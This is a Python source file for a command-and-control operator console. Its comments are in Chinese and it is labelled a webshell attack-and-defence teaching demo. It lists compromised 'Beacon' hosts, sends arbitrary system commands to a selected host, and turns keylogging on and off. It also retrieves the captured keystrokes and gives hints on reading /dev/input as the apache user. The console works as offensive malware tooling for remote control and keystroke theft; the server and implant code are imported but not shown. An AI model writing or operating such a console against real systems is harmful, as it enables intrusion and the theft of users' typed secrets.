#!/usr/bin/env python3
"""
C2 操作控制台

交互式命令行界面，用于管理 Beacon 连接、下发指令、查看键盘数据。

命令列表：
  list / ls          - 列出所有在线 Beacon
  use <id>           - 选择当前操作的 Beacon
  cmd <command>      - 向当前 Beacon 下发系统命令
  keylog on          - 开启当前 Beacon 键盘记录
  keylog off         - 关闭当前 Beacon 键盘记录
  keylog view        - 查看当前 Beacon 键盘数据
  keylog all         - 查看所有键盘记录数据
  keylog clear       - 清空所有键盘记录
  alerts             - 查看事件日志
  info               - 查看当前 Beacon 详细信息
  back               - 取消选择当前 Beacon
  exit / quit        - 退出控制台

安全警告：此程序为安全教学演示用的 C2 控制台！
         严禁用于任何非授权场景！
"""

import sys
import os
import time
import threading

# 添加同目录路径
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import c2_server


class C2Console:
    """C2 交互式控制台"""

    def __init__(self):
        self.current_shell = None
        self.server_thread = None

    def print_banner(self):
        print("""
╔══════════════════════════════════════════════╗
║          C2 远控操作控制台                   ║
║          WebShell 攻防演示系统               ║
╚══════════════════════════════════════════════╝
""")
        print("命令帮助: list | use <id> | cmd <command> | keylog on/off/view | alerts | exit")
        print()

    def cmd_list(self):
        """列出所有在线 Beacon"""
        shells = c2_server.get_shells()
        if not shells:
            print("  [!] 当前无在线 Beacon")
            return

        print("  ┌────────┬──────────────┬──────────┬─────────────────┬──────────┐")
        print("  │ ID     │ 主机名       │ 用户     │ 上线时间        │ 键盘记录 │")
        print("  ├────────┼──────────────┼──────────┼─────────────────┼──────────┤")
        for sid, info in sorted(shells.items()):
            kl_status = "ON  [!]" if info['keylog_active'] else "OFF"
            print("  │ #{:<5} │ {:<12} │ {:<8} │ {:<15} │ {:<8} │".format(
                sid,
                info['hostname'][:12],
                info['user'][:8],
                info['connected_time'][11:],
                kl_status
            ))
        print("  └────────┴──────────────┴──────────┴─────────────────┴──────────┘")

    def cmd_use(self, args):
        """选择 Beacon"""
        if not args:
            print("  用法: use <id>")
            return
        try:
            shell_id = int(args[0])
        except ValueError:
            print("  [!] ID 必须是数字")
            return

        shells = c2_server.get_shells()
        if shell_id not in shells:
            print("  [!] Shell#{} 不存在或已离线".format(shell_id))
            return

        self.current_shell = shell_id
        info = shells[shell_id]
        print("  [+] 已选择 Shell#{} - {}@{} ({})".format(
            shell_id, info['user'], info['hostname'], info['addr']
        ))

    def cmd_exec(self, args):
        """下发命令"""
        if self.current_shell is None:
            print("  [!] 请先使用 use <id> 选择一个 Beacon")
            return
        if not args:
            print("  用法: cmd <command>")
            return

        command = ' '.join(args)
        print("  [*] 向 Shell#{} 下发命令: {}".format(self.current_shell, command))

        ok, msg = c2_server.send_command(self.current_shell, 'exec ' + command)
        if not ok:
            print("  [-] 发送失败: {}".format(msg))
            return

        # 等待结果
        print("  [*] 等待执行结果...", end='', flush=True)
        time.sleep(0.5)

        ok, result = c2_server.recv_command_result(self.current_shell, timeout=15)
        if ok:
            print("\r  [+] 执行结果:")
            print("  " + "-" * 50)
            for line in result.split('\n'):
                print("  " + line)
            print("  " + "-" * 50)
        else:
            print("\r  [-] 获取结果失败: {}".format(result))

    def cmd_keylog(self, args):
        """键盘记录控制"""
        if not args:
            print("  用法: keylog on | keylog off | keylog view | keylog all | keylog clear")
            return

        action = args[0]

        if action == 'on':
            if self.current_shell is None:
                print("  [!] 请先使用 use <id> 选择一个 Beacon")
                return
            ok, msg = c2_server.send_command(self.current_shell, 'keylog_on')
            if ok:
                print("  [*] 已向 Shell#{} 发送键盘记录启动指令".format(self.current_shell))
                time.sleep(1)
                # 检查状态
                shells = c2_server.get_shells()
                if self.current_shell in shells:
                    if shells[self.current_shell]['keylog_active']:
                        print("  [+] Shell#{} 键盘记录已启动".format(self.current_shell))
                    else:
                        print("  [?] 等待确认中...")
            else:
                print("  [-] 发送失败: {}".format(msg))

        elif action == 'off':
            if self.current_shell is None:
                print("  [!] 请先使用 use <id> 选择一个 Beacon")
                return
            ok, msg = c2_server.send_command(self.current_shell, 'keylog_off')
            if ok:
                print("  [*] 已向 Shell#{} 发送键盘记录停止指令".format(self.current_shell))
            else:
                print("  [-] 发送失败: {}".format(msg))

        elif action == 'view':
            if self.current_shell is None:
                print("  [!] 请先使用 use <id> 选择一个 Beacon")
                return
            # 向 Beacon 下发 keylog_dump 指令，触发数据回传
            ok, msg = c2_server.send_command(self.current_shell, 'keylog_dump')
            if not ok:
                print("  [-] 发送失败: {}".format(msg))
                return
            ok, data = c2_server.recv_keylog_result(self.current_shell, timeout=15)
            if ok:
                if data:
                    print("  [+] Shell#{} 键盘记录数据:".format(self.current_shell))
                    print("  " + "-" * 50)
                    print("  " + data)
                    print("  " + "-" * 50)
                    print("  总计 {} 个字符".format(len(data)))
                else:
                    print("  [!] Shell#{} 暂无键盘记录数据".format(self.current_shell))
                    print("  [*] 提示: 请在虚拟机的本地控制台(TTY)输入按键，")
                    print("          SSH 远程输入不会生成 /dev/input 键盘事件；")
                    print("          并确保 apache 用户在 input 组中可读取键盘设备。")
            else:
                print("  [-] {}".format(data))

        elif action == 'all':
            all_data = c2_server.get_keylog_data()
            if not all_data:
                print("  [!] 暂无任何键盘记录数据")
                return
            print("  [+] 全部键盘记录数据:")
            print("  " + "=" * 60)
            for entry in all_data:
                print("  [{}] Shell#{} ({})".format(
                    entry['time'], entry['shell_id'], entry['hostname']
                ))
                print("  数据: {}".format(entry['data']))
                print("  " + "-" * 60)

        elif action == 'clear':
            c2_server.clear_keylog()
            print("  [+] 已清空所有键盘记录数据")

        else:
            print("  [!] 未知操作: {}".format(action))
            print("  用法: keylog on | keylog off | keylog view | keylog all | keylog clear")

    def cmd_alerts(self):
        """查看事件日志"""
        alerts = c2_server.get_alerts()
        if not alerts:
            print("  [!] 暂无事件日志")
            return
        print("  [+] 事件日志 (最近 {} 条):".format(len(alerts)))
        print("  " + "=" * 60)
        for a in alerts[-30:]:
            print("  [{}] {} {}".format(a['time'], a['level'], a['message']))
        print("  " + "=" * 60)

    def cmd_info(self):
        """查看当前 Beacon 信息"""
        if self.current_shell is None:
            print("  [!] 未选择 Beacon")
            return
        shells = c2_server.get_shells()
        if self.current_shell not in shells:
            print("  [!] Shell#{} 已离线".format(self.current_shell))
            self.current_shell = None
            return
        info = shells[self.current_shell]
        print("  [+] Shell#{} 详细信息:".format(self.current_shell))
        print("  " + "-" * 40)
        print("  主机名:     {}".format(info['hostname']))
        print("  用户:       {}".format(info['user']))
        print("  地址:       {}".format(info['addr']))
        print("  上线时间:   {}".format(info['connected_time']))
        print("  最后活动:   {}".format(info['last_seen']))
        print("  键盘记录:   {}".format("ON [!]" if info['keylog_active'] else "OFF"))
        print("  " + "-" * 40)

    def cmd_back(self):
        """取消选择"""
        if self.current_shell:
            print("  [*] 已取消选择 Shell#{}".format(self.current_shell))
            self.current_shell = None
        else:
            print("  [!] 当前未选择 Beacon")

    def start_server(self):
        """在后台线程启动 C2 服务器"""
        self.server_thread = threading.Thread(target=c2_server.start_server, daemon=True)
        self.server_thread.start()
        time.sleep(1)  # 等待服务器启动

    def run(self):
        """主循环"""
        self.print_banner()

        # 启动 C2 服务器
        print("  [*] 启动 C2 服务器...")
        self.start_server()
        print("  [+] C2 服务器已就绪")
        print()

        while True:
            try:
                prompt = "C2"
                if self.current_shell:
                    prompt += "(Shell#{})".format(self.current_shell)
                prompt += "> "

                user_input = input(prompt).strip()
                if not user_input:
                    continue

                parts = user_input.split()
                cmd = parts[0].lower()
                args = parts[1:]

                if cmd in ('exit', 'quit'):
                    print("  [*] 再见")
                    break
                elif cmd in ('list', 'ls'):
                    self.cmd_list()
                elif cmd == 'use':
                    self.cmd_use(args)
                elif cmd == 'cmd':
                    self.cmd_exec(args)
                elif cmd == 'keylog':
                    self.cmd_keylog(args)
                elif cmd == 'alerts':
                    self.cmd_alerts()
                elif cmd == 'info':
                    self.cmd_info()
                elif cmd == 'back':
                    self.cmd_back()
                elif cmd == 'help':
                    print("  命令列表:")
                    print("    list / ls          - 列出在线 Beacon")
                    print("    use <id>           - 选择 Beacon")
                    print("    cmd <command>      - 下发系统命令")
                    print("    keylog on          - 开启键盘记录")
                    print("    keylog off         - 关闭键盘记录")
                    print("    keylog view        - 查看当前 Beacon 键盘数据")
                    print("    keylog all         - 查看所有键盘数据")
                    print("    keylog clear       - 清空键盘记录")
                    print("    alerts             - 查看事件日志")
                    print("    info               - 当前 Beacon 信息")
                    print("    back               - 取消选择")
                    print("    exit / quit        - 退出")
                else:
                    print("  [!] 未知命令: {} (输入 help 查看帮助)".format(cmd))

            except KeyboardInterrupt:
                print()
                continue
            except EOFError:
                print()
                break
            except Exception as e:
                print("  [!] 错误: {}".format(e))


if __name__ == '__main__':
    console = C2Console()
    console.run()
